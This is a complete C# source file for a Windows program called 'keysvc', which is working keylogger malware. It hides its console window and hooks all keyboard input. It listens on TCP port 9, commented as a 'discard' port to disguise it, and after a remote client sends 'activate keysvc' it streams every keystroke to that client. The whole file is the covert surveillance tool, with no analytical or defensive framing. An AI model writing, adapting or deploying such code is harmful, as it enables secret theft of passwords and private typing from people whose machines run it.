using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace keysvc
{
    class Program
    {
        private const int SW_HIDE = 0;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static int port = 9; //Run as discard...
        private static NetworkStream stream;
        private static TcpListener listener;
        private static object streamLock = new object();

        public static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            var task = Task.Factory.StartNew(() => StartListening());

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private static void StartListening()
        {
            while (true)
            {
                if (listener == null)
                {
                    listener = new TcpListener(IPAddress.Any, port);
                    listener.Start();
                }

                try
                {
                    var active = false;
                    var client = listener.AcceptTcpClient();
                    if (client.Connected)
                    {
                        var s = client.GetStream();
                        try
                        {
                            byte[] readBuffer = new byte[100];
                            StringBuilder msg = new StringBuilder();
                            while (!active)
                            {
                                int bytesread = s.Read(readBuffer, 0, readBuffer.Length);
                                if (bytesread == 0) throw new Exception("");
                                while (bytesread > 0)
                                {
                                    msg.Append(ASCIIEncoding.UTF8.GetString(readBuffer).Replace("\n","").Replace("\0",""));
                                    if (msg.ToString().Contains("activate keysvc"))
                                    {
                                        active = true;
                                        lock (streamLock)
                                        {
                                            stream = s;
                                        }
                                        break;
                                    }
                                    else if (msg.Length > 100)
                                    {
                                        msg = new StringBuilder();
                                    }
                                    bytesread = s.Read(readBuffer, 0, readBuffer.Length);
                                }
                            }
                        }
                        catch
                        {
                            if (client.Connected) client.Close();
                        }

                        while (client.Connected) Thread.Sleep(1000);
                    }
                }
                catch
                {
                }
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                //Console.WriteLine((Keys)vkCode);
                byte[] buffer = ASCIIEncoding.UTF8.GetBytes(((Keys)vkCode).ToString() + Environment.NewLine);

                lock (streamLock)
                {
                    if (stream != null)
                    {
                        try
                        {
                            stream.Write(buffer, 0, buffer.Length);
                            stream.Flush();
                        }
                        catch { }
                    }
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        #region DllImports
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        #endregion
    }
}
